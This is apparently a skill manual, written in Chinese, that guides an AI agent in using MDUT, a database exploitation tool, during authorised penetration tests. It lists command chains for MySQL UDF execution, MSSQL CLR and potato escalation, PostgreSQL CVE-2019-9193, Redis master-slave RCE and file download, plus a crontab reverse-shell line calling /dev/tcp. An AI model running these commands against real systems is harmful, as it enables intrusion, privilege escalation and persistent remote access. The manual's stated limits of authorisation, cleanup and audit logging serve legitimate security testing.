---
name: pentest-mdut
description: MDUT CLI（Multiple Database Utilization Tools，数据库利用与后渗透）操作手册：部署与最小套件、task 隔离、命令词汇、退出码、大文件纪律、清痕义务与 SOCKS5 入站代理。
whenToUse: 涉及数据库弱口令利用（MySQL/MSSQL/PostgreSQL/Oracle/Redis/MongoDB）、UDF/CLR/potato 系命令执行、数据库侧文件读写、反弹 Shell 的授权测试任务时加载。
priority: high
alwaysApply: false
---

# MDUT CLI 工具手册（v1.1 · 部署节定稿）

> 权威手册。**skill 不复制参数级文档**：命令清单以 `mdut --help`、参数以 `mdut help <command>` 实时输出为准——升级自动跟上，复制两份必然漂移。
> 仅限授权安全测试使用；对共享/生产实例只做非破坏验证（变异操作一律可弃容器）。

## 何时用 / 怎么想

- 拿到数据库凭据（弱口令/注入拖库/配置文件提取）后，先 `add` 登记进某个 task（即做连通测试，失败会如实退出码 3/4 并给 hint），再按类型选路：
  - **MySQL** 弱口令 → `info`（版本/平台/plugin_dir/sys_eval 状态）→ `exec 'cmd'`（函数缺失自动走 UDF 部署链；`clean` 卸载）。
  - **MSSQL** sa → `exec --method xpcmdshell`（无回显自动激活重试）→ 递进 oap → agent → clr → **potato 系**（badpotato/godpotato/efspotato/efspotato_shellcode/sweetpotato；kitmain CLR 与程序集自动部署）；`recovery` 一键还原组件（含 potato 卸载）。
  - **PostgreSQL** → `info` 看 route 分档（low=system / udf / cve=CVE-2019-9193），`exec` 自动选路；文件读写走 pg_ls_dir / pg_read_binary_file / lo_export。
  - **Oracle** DBA → `exec --method java`（ShellUtil 缺失自动导入）；无 DBA 试 `--method scheduler`；文件五件套走 FileUtil（无 mkdir）。
  - **Redis** → `info` 附带 CVE 扫描（未授权/CVE-2022-0543/主从窗口）；未授权写文件走 `crontab/sshkey/rdb`（免 rogue）；主从 RCE 需**先自起外部 rogue** 再 `exec --vps-host/--vps-port`（详见「rogue 外置」纪律）。
  - **MongoDB** → `add mongodb` + `info`（版本/认证态/库名枚举；仅探测面，深利用走外部资产）。
- 一个任务（engagement）= 一个 `--task` 名 = 一个隔离 data.db；**临时调试可省略 `--task`（落 `default`），正式任务必须显式命名**；connection_id 仅 task 内有效，跨任务同号是不同连接。

## 部署与资产（最小套件）

> 结论（实测验证）：**渗透上传不必带完整 Driver/ + Plugins/——`mdut.jar` + 目标库对应的一个驱动 jar 即可探测与执行 SQL；只有提权链才需要对应 Plugins 载荷。**

### 布局约束（硬约束）

```
<上传目录>/
├── mdut.jar
├── Driver/           # 按目标库挑一个文件放进去
└── Plugins/          # 仅需要提权链时按库挑子目录
```

- 路径解析固定为 **jar 同目录**（`Utils.getSelfPath()`），Driver/Plugins 与 `mdut.jar` 必须平级；文件名固定 `Driver/{mysql,mssql,oracle,postgresql}.jar`。
- **不支持把 Driver/ 打进 jar**（有意边界：AGENTS.md §1.2）；redis/mongodb 驱动已内嵌 uber-jar，不需要 Driver/。
- 单库最小套件下 `doctor` 会如实报其它库驱动/插件缺失——那只是自检提示，不影响你实际只用该库的操作。

### 按库资产清单

| 目标库 | Driver/（必需） | Plugins/（仅提权链需要） |
|---|---|---|
| mysql | `Driver/mysql.jar` | `Plugins/Mysql/udf_{linux32,linux64,win32,win64,win_ex}_hex.txt`（exec UDF 链 / revshell DLL） |
| mssql | `Driver/mssql.jar` | `Plugins/Mssql/clr.txt`（CLR）；potato 系再加 `badpotato/godpotato/efspotato/efspotato_shellcode/sweetpotato.txt` |
| postgresql | `Driver/postgresql.jar` | `Plugins/PostgreSql/<ver>_<os>_<bits>_hex.txt`（仅 8.2–9.2 的 udf 路线；≥9.3 走 cve 不需要） |
| oracle | `Driver/oracle.jar` | `Plugins/Oracle/FileUtil.java`（文件五件套）+ `ShellUtil.java`（exec/revshell） |
| redis | — | `Plugins/Redis/exp.so`（主从链，目标侧版本须匹配） |
| mongodb | — | —（仅 info 探测面） |

- 载荷缺失会如实报错（exit 3 + 指明缺哪个目录），不会写入空载荷；先跑 `doctor` 自检最稳。
- **渗透打包建议**：`mdut.jar`（13MB）+ 单驱动 jar +（需要时）对应 Plugins 子目录；redis 主从链另需攻击机本机起 rogue 脚本（见纪律 6）。

### 环境变量（运维侧）

`MDUT_JAVA`（java 路径）/ `MDUT_JAVA_OPTS`（附加 JVM 参数）/ `MDUT_TASK`（缺省 task）/ `MDUT_TASKS_ROOT`（迁移 tasks 根目录）/ `MDUT_JAR`（开发态覆盖 jar 路径）。

## 语法与约定

```bash
mdut [--task NAME] [--format json|text] [--timeout SEC] [--proxy socks5://[user:pass@]h:p] [-c ENC] <command> [--flags]
# 等价 ./cli/mdut <同参数>；wrapper 负责 task 解析/chdir/守卫（data.db 与审计账的符号链接拒判、网络 fs 拒判）
```

- stdout **恰好一行 JSON**：成功 `{"ok":true,"task":...,"tool":...,"id"?,"text","data"?}`；失败 `{"ok":false,"error","hint","data"?}`。日志全走 stderr（`--format text` 时内容直出 stdout 便于管道）。
- **退出码**：`0` 成功 / `2` 用法错误（含未知 flag——拼错会被拒而不是静默吞）/ `3` 目标失败 / `4` 超时（SocketTimeout 类，含看门狗兜底）/ `5` task 写锁竞争（exec/clean/write/upload/rm/mkdir/deploy/recovery/crontab/sshkey/rdb/revshell/list-files 持锁）。
- `--timeout` 缺省 5s（Dao 连接/套接字超时；看门狗 = timeout+5s，redis 主从链自动放宽为 3×timeout+15s，无需手工调大）。
- **代理**：`--proxy socks5://[user:pass@]host:port` 仅入站（连目标库；不支持出站枢轴——内网穿透先交隧道工具，再 `--proxy`）。`add` 时带 `--proxy` 的连接，后续 `--id` 命令**自动回放存量代理**；经代理的内网目标请用 **IP**（主机名会本地先解析，失败 hint 会引导）。
- `doctor` 自检：java/驱动/Plugins/task 库健康/代理连通；失败信封带 `data.checks` 逐项明细（含缺哪个文件）；`task list|path` 管理任务。

## 常用命令（L2 高频；完整清单 `mdut --help`）

```bash
mdut --task T add mysql --host 10.0.0.1 --port 3306 --user root --pass '123456' --db mysql --memo target   # 信封含 "id"
mdut --task T list [--group G] ; mdut --task T delete 3
mdut --task T info --id 3                                    # 结构化 data：版本/平台/route/CVE
mdut --task T exec --id 3 'id'                               # mysql：UDF 链后传 shell 命令原文（勿手写 SELECT sys_eval）
mdut --task T exec --id 4 --method clr 'whoami'              # mssql；potato 系：--method badpotato|godpotato|efspotato|efspotato_shellcode|sweetpotato
mdut --task T sql --id 3 "select version()"                  # 原生 SQL（兼容旧形式：--sql --id 3 "..."）
mdut --task T list-files --id 3 /var/www                     # 目录发现（各库路线见 help）
mdut --task T read --id 3 /etc/hostname                      # 小内容（data.b64，二进制安全）
mdut --task T download --id 3 /etc/passwd --out ./passwd     # 大文件直存本地（信封只报字节数）
mdut --task T upload --id 5 ./tool.elf /tmp/tool.elf ; mdut --task T write --id 5 /tmp/f.txt --stdin
mdut --task T rm --id 4 /tmp/x ; mdut --task T mkdir --id 4 /tmp/d    # 文件删除是 rm（delete 保留给连接记录）
mdut --task T revshell --id 3 10.0.0.99 4444
mdut --task T exec --id 6 --vps-host 10.0.0.99 --vps-port 21000 'id'  # redis 主从 RCE（先起外部 rogue）
mdut --task T clean --id 3 ; mdut --task T recovery --id 4   # 清痕（mssql recovery 含 potato 卸载）
mdut --task T crontab --id 6 '*/1 * * * * /bin/sh -i >& /dev/tcp/IP/PORT 0>&1'
mdut --task T doctor ; mdut version ; mdut task list
```

## 长尾能力（不进 skill 正文）

oracle `--oracle-service`、`-c` 编码（MSSQL 缺省 GB2312 现网行为）、`--format text`、`task path`、`add-group/delete-group`、mongodb `info` 字段等：

1. `mdut --help` 查命令清单；2. `mdut help <command>` 看参数/必填/示例；3. 按失败信封 `hint` 修正调用。

## 纪律（违反即返工）

1. **大文件**：`download --out` / `upload` 直存直传，禁止把文件内容读进上下文；upload/write 超 64MB 会被拒（SQL 管道内存约束，信封给可操作 hint）；JSON 内嵌 base64 仅限小内容（超限有 `truncated` 提示）。
2. **清痕义务**：提权组件（UDF/CLR/potato/Java Source/Redis Module）用完必须 `clean`（mssql 必要时 `recovery`），并在任务记录留痕。
3. **审计**：每条命令自动落账 `<task>/logs/audit.jsonl`（argv 中 --pass/代理凭据自动打码）；禁止绕过。
4. **task 卫生**：凭据不进 skill/文档（data.db 明文继承自上游，不外发任务目录）；正式任务显式 `--task`；任务结束清理 `tasks/<task>/`。
5. **编码**：目标回显乱码时用 `-c`（如 mssql 现网 GB2312），勿盲目硬试。
6. **rogue 外置**：redis 主从的伪主库是外部进程（仓库 `Plugins/Redis/redis-cus-rogue.py`，用法 `python3 redis-cus-rogue.py 21000 exp.so`，**单发进程：每次部署前重启**）；`--vps-host/--vps-port` 必须成对传入并指向它。仓库自带 exp.so 在 redis 4.0.14 实测可加载；**模块已加载后重复 `--vps-*` 部署会报 ERR loading extension——直接无参 `exec` 即可**；勿用高版本 gcc 自编译 exp.so（redis 4.x 会崩）。
7. **非破坏红线**：共享/生产实例只允许 `info/sql 只读`；crontab/sshkey/rdb/exec/revshell 一律可弃容器。

## 实验室验收

见仓库 `AGENTS.md` §4.1（TC1 本机 Redis / TC2 本机 PostgreSQL / TC3 MySQL+UDF 全链 / TC4 SOCKS5 入站代理 / TC5 Redis 主从 RCE 实弹，含直连负控制与清痕查证）。实测矩阵与 BLOCKED 记录见 `docs/3.CLI命令面规格.md` §10。
